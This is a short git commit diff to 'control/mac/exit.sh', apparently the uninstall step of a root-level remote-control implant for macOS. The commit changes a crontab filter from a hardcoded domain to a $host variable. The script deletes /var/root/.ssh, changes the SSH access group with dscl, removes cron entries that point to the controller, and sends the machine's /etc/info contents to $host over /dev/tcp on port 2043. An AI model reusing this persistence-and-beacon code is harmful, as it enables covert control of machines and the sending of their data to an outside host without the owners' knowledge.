44018e97240a92babf9250c251923b8eae977dd5
ErikBoesen <me@erikboesen.com>
2018-04-01 22:55:40 -0400

    Fix missed $host in mac/exit.sh

--- control/mac/exit.sh
+++ control/mac/exit.sh
@@ -5,7 +5,7 @@ rm -rf /var/root/.ssh
 
 dscl . change /Groups/com.apple.access_ssh-disabled RecordName com.apple.access_ssh-disabled com.apple.access_ssh >/dev/null
 
-grep -v "boesen.science" /var/at/tabs/root > /tmp/crontab
+grep -v "$host" /var/at/tabs/root > /tmp/crontab
 mv /tmp/crontab /var/at/tabs/root
 
 printf "EXIT: $(< /etc/info) leaving network." >/dev/tcp/$host/2043
